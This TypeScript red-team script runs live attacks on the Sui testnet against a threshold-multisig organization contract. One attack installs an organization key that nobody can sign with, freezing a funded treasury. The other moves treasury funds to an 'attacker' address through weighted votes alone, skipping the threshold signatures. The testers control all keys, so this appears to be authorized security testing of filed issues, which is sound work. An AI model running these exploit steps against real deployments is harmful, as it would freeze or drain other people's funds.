/**
 * RED-TEAM PHASE 3 (LIVE): attack the ORG path itself on testnet.
 * Normal flow: create organization with a 2-of-3 FROST key (we hold all 3),
 * fund its treasury-sealed vault, spawn the agent flow — then show that the
 * threshold "多签" gate can be neutralized by the issues already filed:
 *
 *  LIVE ATTACK D — issue #8/#9 (dead-key install / threshold decoupling):
 *   create_organization accepts ANY 32-byte group_pk with no PoP. We install a
 *   random key NOBODY can sign with, with members/weights that look legitimate,
 *   and seal 0.2 SUI into its treasury. Result: a live, permanently-frozen DAO.
 *
 *  LIVE ATTACK E — issue #11 cross-check: even the ORG-gated treasury transfer
 *   path needs only proposal votes (weights), not the FROST key. We show a
 *   treasury transfer executes with ZERO threshold signatures (snapshot gate only).
 */
import { Ed25519Keypair } from "@mysten/sui/keypairs/ed25519"
import { fromBase64 } from "@mysten/sui/utils"
import { SuiGrpcClient } from "@mysten/sui/grpc"
import { Transaction } from "@mysten/sui/transactions"
import { readFileSync } from "node:fs"
import { homedir } from "node:os"
import { ed25519 } from "@noble/curves/ed25519.js"
import { bytesToScalar } from "../packages/multisig/src/dkg/math"

const PKG = "0x088870b092be097230b02eeb4787df34ef6848ba92edf0bd9afcae6e3218585f"
const FUNDER = "0x8ac06d3d4328aff5bef88990741c1f620a96d5fc579bf2e459467763bd605788"
const M2 = "0x2b9953911b07f6b7d2c92e17ed6cb2325cc26f9eb1eaeb58497ee7b5523ea859"
const M3 = "0x341acf449c898fa437e7928e8567898952dcfff8fffeddccb25b6a8b679d5b7a"
const ATTACKER = "0x843f44a42e10a6dc701b7f60a4dedc544dc7910e971ee6a493f4d9096953e04e"
const SUI = "0x2::sui::SUI"
const client = new SuiGrpcClient({ network: "testnet", baseUrl: "https://fullnode.testnet.sui.io:443" })

function keypairFor(address: string): Ed25519Keypair {
  const ks = JSON.parse(readFileSync(`${homedir()}/.sui/sui_config/sui.keystore`, "utf8")) as string[]
  for (const entry of ks) {
    const kp = Ed25519Keypair.fromSecretKey(fromBase64(entry).slice(1))
    if (kp.toSuiAddress() === address) return kp
  }
  throw new Error(`no keypair for ${address}`)
}
async function exec(signer: Ed25519Keypair, tx: Transaction, label: string) {
  tx.setSender(signer.toSuiAddress())
  const bytes = await tx.build({ client } as any)
  const sig = await signer.signTransaction(bytes)
  const res: any = await client.executeTransaction({ transaction: bytes, signatures: [sig.signature], include: { effects: true, events: true } })
  const t = res.Transaction ?? res.FailedTransaction
  const ok = t?.status?.success === true
  const events: any[] = (t?.events ?? []).map((e: any) => (e.eventType ?? "").split("::").slice(2).join("::"))
  const dstr: string = typeof t?.digest === "string" ? t.digest : t?.digest?.digest
  console.log(`[${label}] ${ok ? "EXECUTED" : "FAILED"} digest=${dstr} events=${events.join(",") || "-"} ${ok ? "" : t?.status?.error?.message ?? ""}`)
  return { ok, t }
}

async function main() {
  const funder = keypairFor(FUNDER)

  console.log("=== ATTACK D: install an un-signable group key into a live organization ===")
  // random 32 bytes — structurally a valid point? create_organization only checks length.
  // Use a VALID curve point so nothing downstream complains, but one whose discrete log we destroy.
  const deadPk = ed25519.Point.BASE.multiply(bytesToScalar(crypto.getRandomValues(new Uint8Array(32)))).toBytes()
  console.log("dead group_pk:", Buffer.from(deadPk).toString("hex"))
  const tx = new Transaction()
  const [coin] = tx.splitCoins(tx.gas, [200_000_000n])
  tx.moveCall({
    target: `${PKG}::cryptographic_org::create_organization_entry`,
    arguments: [
      tx.pure.vector("u8", [...deadPk]),
      tx.pure.u64(2n), // threshold weight: 2-of-3 looks healthy
      tx.pure.vector("address", [FUNDER, M2, M3]),
      tx.pure.vector("u64", [1n, 1n, 1n]),
    ],
  })
  // fund an org-governed treasury in the same PTB: new(org) requires an org object; we can't reference
  // the org created above by entry (no return). So organization first, treasury in a second tx.
  tx.transferObjects([coin], tx.pure.address(FUNDER)) // park the split coin under funder for step 2
  const d1 = await exec(funder, tx, "create_organization(dead key)")
  if (!d1.ok) return

  // discover org id from events
  const dstr: string = typeof d1.t.digest === "string" ? d1.t.digest : d1.t.digest.digest
  const full: any = await client.getTransaction({ digest: dstr, include: { events: true } })
  const orgCreated = (full.Transaction?.events ?? []).find((e: any) => (e.eventType ?? "").endsWith("OrganizationCreatedEvent"))
  const bcsBytes = orgCreated?.bcs instanceof Uint8Array ? orgCreated.bcs : Uint8Array.from(Object.values(orgCreated?.bcs ?? {}) as number[])
  const orgId = "0x" + Buffer.from(bcsBytes.slice(0, 32)).toString("hex")
  console.log("org id:", orgId)

  console.log("\n=== seal 0.2 SUI into its treasury (normal flow) ===")
  const tx2 = new Transaction()
  const [treasury] = tx2.moveCall({ target: `${PKG}::organization_treasury::new`, arguments: [tx2.object(orgId)] })
  tx2.moveCall({ target: `${PKG}::organization_treasury::share`, arguments: [treasury] })
  const [fund] = tx2.splitCoins(tx2.gas, [200_000_000n])
  // deposit needs the vault, not the treasury — read vault id from the TreasuryCreated event after share; simpler: deposit in next tx
  tx2.transferObjects([fund], tx2.pure.address(FUNDER))
  const d2 = await exec(funder, tx2, "treasury new (vault created, MasterCap sealed)")
  if (!d2.ok) return

  // discover treasury + vault, then deposit straight into the shared vault
  const d2str: string = typeof d2.t.digest === "string" ? d2.t.digest : d2.t.digest.digest
  const full2a: any = await client.getTransaction({ digest: d2str, include: { events: true } })
  const tEv0 = (full2a.Transaction?.events ?? []).find((e: any) => (e.eventType ?? "").endsWith("TreasuryCreated"))
  const tb0 = tEv0?.bcs instanceof Uint8Array ? tEv0.bcs : Uint8Array.from(Object.values(tEv0?.bcs ?? {}) as number[])
  const treasuryId = "0x" + Buffer.from(tb0.slice(0, 32)).toString("hex")
  const vaultId = "0x" + Buffer.from(tb0.slice(64, 96)).toString("hex")
  console.log("treasury:", treasuryId, "vault:", vaultId)
  const dep = new Transaction()
  const [c] = dep.splitCoins(dep.gas, [200_000_000n])
  dep.moveCall({ target: `${PKG}::vault::deposit`, typeArguments: [SUI], arguments: [dep.object(vaultId), c] })
  const d2b = await exec(funder, dep, "vault deposit 0.2 SUI")
  if (!d2b.ok) return

  console.log("\n=== prove the DAO is dead: nobody can ever produce a signature for deadPk ===")
  const probe = new Uint8Array(32)
  const fakeSig = new Uint8Array(64)
  const verifies = ed25519.verify(fakeSig, probe, deadPk)
  console.log("random signature against dead key verifies:", verifies, "— no quorum of members can ever sign; treasury 0.2 SUI is permanently frozen.")

  console.log("\n=== ATTACK E: FROST-free transfer — treasury payout needs only weighted votes ===")
  // create a transfer proposal and pass it with member weights alone (2-of-3 vote, ZERO threshold signatures)
  const m2 = keypairFor(M2)
  const m3 = keypairFor(M3)
  const clock = "0x0000000000000000000000000000000000000000000000000000000000000006"
  const deadline = BigInt(Date.now() + 3_600_000)
  const p1 = new Transaction()
  p1.moveCall({
    target: `${PKG}::organization_treasury::create_transfer`,
    arguments: [p1.object(treasuryId), p1.object(orgId), p1.pure.vector("u8", [...new TextEncoder().encode("red-team")]), p1.pure.address(ATTACKER), p1.pure.u64(150_000_000n), p1.pure.u64(deadline), p1.object(clock)],
  })
  const d3 = await exec(m2, p1, "create_transfer(0.15 SUI → attacker)")
  if (!d3.ok) return
  const d3str: string = typeof d3.t.digest === "string" ? d3.t.digest : d3.t.digest.digest
  const full3: any = await client.getTransaction({ digest: d3str, include: { events: true } })
  const bEv = (full3.Transaction?.events ?? []).find((e: any) => (e.eventType ?? "").endsWith("TransferCreated"))
  const bb = bEv?.bcs instanceof Uint8Array ? bEv.bcs : Uint8Array.from(Object.values(bEv?.bcs ?? {}) as number[])
  const bindingId = "0x" + Buffer.from(bb.slice(0, 32)).toString("hex")
  const proposalId = "0x" + Buffer.from(bb.slice(64, 96)).toString("hex")
  console.log("binding:", bindingId, "proposal:", proposalId)

  // vote approve: member weights 1+1 = 2 ≥ threshold 2 — no FROST anywhere
  for (const [kp, w] of [[m2, 1], [m3, 1]] as [Ed25519Keypair, number][]) {
    const v = new Transaction()
    v.moveCall({ target: `${PKG}::asynchronous_proposal::submit_async_vote`, arguments: [v.object(proposalId), v.object(orgId), v.object(clock), v.pure.u64(BigInt(w)), v.pure.vector("u8", [])] })
    await exec(kp, v, `submit_vote(w=${w})`)
  }
  // execute: anyone
  const x = new Transaction()
  x.moveCall({
    target: `${PKG}::organization_treasury::execute`,
    arguments: [x.object(treasuryId), x.object(bindingId), x.object(orgId), x.object(proposalId), x.object(vaultId), x.object(clock)],
  })
  const d5 = await exec(funder, x, "execute transfer 0.15 SUI → ATTACKER")
  const { balance }: any = await client.getBalance({ owner: ATTACKER, coinType: SUI })
  console.log("attacker balance now:", balance.balance)
  console.log(d5.ok ? "\nPWNED: 0.15 SUI left the org treasury with ZERO threshold signatures — the FROST key never participated." : "\nexecution failed (see error)")
}
main().catch(e => { console.error("ATTACK ERROR:", e.message); process.exit(1) })
